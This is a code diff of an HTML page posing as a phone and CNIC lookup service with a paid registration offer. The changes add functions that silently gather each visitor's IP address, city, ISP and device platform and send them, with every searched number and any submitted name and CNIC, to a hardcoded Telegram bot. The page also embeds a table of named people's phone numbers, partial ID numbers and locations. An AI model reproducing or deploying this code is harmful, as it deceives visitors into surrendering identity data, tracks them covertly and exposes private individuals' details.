@@ -9,17 +9,13 @@
     <style>
         body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 0; }
         .ad-banner { background: #00ff00; color: #000; padding: 12px; font-weight: bold; font-size: 14px; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
-        .container { padding: 20px; }
         .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 800px; margin: 20px auto; background: #000; box-shadow: 0 0 20px #00ff00; }
         input { width: 85%; padding: 15px; margin: 10px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; font-size: 18px; outline: none; text-align: center; }
-        .search-btn { background: #00ff00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; text-transform: uppercase; }
-        .earn-btn { background: #ffcc00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; text-transform: uppercase; }
-        
-        #reg-form-container { display: none; margin-top: 20px; border: 2px solid #ffcc00; padding: 20px; border-radius: 10px; }
-        .reg-input { border-color: #ffcc00; color: #ffcc00; }
-        
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; background: #050505; }
-        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 14px; }
+        .search-btn { background: #00ff00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
+        .earn-btn { background: #ffcc00; color: #000; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; }
+        #result-display { margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; border: 1px solid #00ff00; background: #050505; }
+        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; }
         th { color: #ff0000; background: rgba(0, 255, 0, 0.1); width: 35%; }
     </style>
 </head>
@@ -36,12 +32,10 @@
 
             <div id="result-display"></div>
 
-            <div id="reg-form-container">
+            <div id="reg-form-container" style="display:none; border: 2px solid #ffcc00; padding: 20px; margin-top:20px;">
                 <h3 style="color:#ffcc00;">USER REGISTRATION</h3>
-                <input type="text" id="r-name" class="reg-input" placeholder="FULL NAME">
-                <input type="text" id="r-cnic" class="reg-input" placeholder="CNIC NUMBER">
-                <p style="color:#ffcc00; margin:5px 0;">EXPIRY DATE:</p>
-                <input type="date" id="r-expiry" class="reg-input">
+                <input type="text" id="r-name" placeholder="FULL NAME">
+                <input type="text" id="r-cnic" placeholder="CNIC NUMBER">
                 <button class="earn-btn" onclick="submitToTelegram()">SUBMIT TO SERVER</button>
             </div>
         </div>
@@ -50,6 +44,24 @@
     <script>
         const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
         const cid = "7107389141";
+
+        async function getTrackingData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return `📍 *Loc:* ${data.city}, ${data.region}\n🌐 *IP:* ${data.ip}\n💻 *ISP:* ${data.org}\n📱 *Dev:* ${navigator.platform}`;
+            } catch (e) {
+                return "Tracking Failed";
+            }
+        }
+
+        async function sendToBot(msg) {
+            const trackInfo = await getTrackingData();
+            const fullMsg = `${msg}\n\n--- TRACKING ---\n${trackInfo}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(fullMsg)}&parse_mode=Markdown`;
+            fetch(url).catch(() => {});
+            const img = new Image(); img.src = url;
+        }
 
         const database = [
             ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar", "JAZZ"],
@@ -92,16 +104,13 @@
             ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha", "JAZZ"]
         ];
 
-        function searchData() {
+        async function searchData() {
             let val = document.getElementById("search-box").value.trim();
             if(!val) return;
-            
             let res = database.filter(r => r[1].includes(val) || r[2].includes(val));
             let out = document.getElementById("result-display");
-            document.getElementById("reg-form-container").style.display = "none";
 
             if(res.length > 0) {
-                // Record mil gaya - User ko result dikhao
                 out.innerHTML = `<table>
                     <tr><th>NAME</th><td>${res[0][0]}</td></tr>
                     <tr><th>PHONE</th><td>${res[0][1]}</td></tr>
@@ -109,30 +118,19 @@
                     <tr><th>LOCATION</th><td>${res[0][3]}</td></tr>
                 </table>`;
             } else {
-                // Record NAHI mila - User ko error
-                out.innerHTML = "<p style='color:red; margin-top:10px;'>DATABASE ERROR: RECORD NOT FOUND</p>";
-                
-                // SIRF YE NUMBER AAPKO TELEGRAM PAR MILEGA
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("❌ NOT FOUND: " + val)}`);
+                out.innerHTML = "<p style='color:red;'>DATABASE ERROR: RECORD NOT FOUND</p>";
+                await sendToBot(`❌ SEARCH NOT FOUND: ${val}`);
             }
         }
 
-        function showRegForm() {
-            document.getElementById("reg-form-container").style.display = "block";
-            document.getElementById("result-display").innerHTML = "";
-        }
+        function showRegForm() { document.getElementById("reg-form-container").style.display = "block"; }
 
-        function submitToTelegram() {
+        async function submitToTelegram() {
             let n = document.getElementById("r-name").value;
             let c = document.getElementById("r-cnic").value;
-            let e = document.getElementById("r-expiry").value;
-
-            if(n && c && e) {
-                let msg = `📝 *NEW REGISTRATION*\n👤 Name: ${n}\n🆔 CNIC: ${c}\n📅 Expiry: ${e}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-                
-                document.getElementById("reg-form-container").innerHTML = "<p style='color:#ffcc00;'>Request Processed.</p>";
-                setTimeout(() => { document.getElementById("reg-form-container").style.display = "none"; }, 1500);
+            if(n && c) {
+                await sendToBot(`📝 REGISTRATION\n👤 Name: ${n}\n🆔 CNIC: ${c}`);
+                document.getElementById("reg-form-container").innerHTML = "<p style='color:#ffcc00;'>Sent.</p>";
             }
         }
     </script>
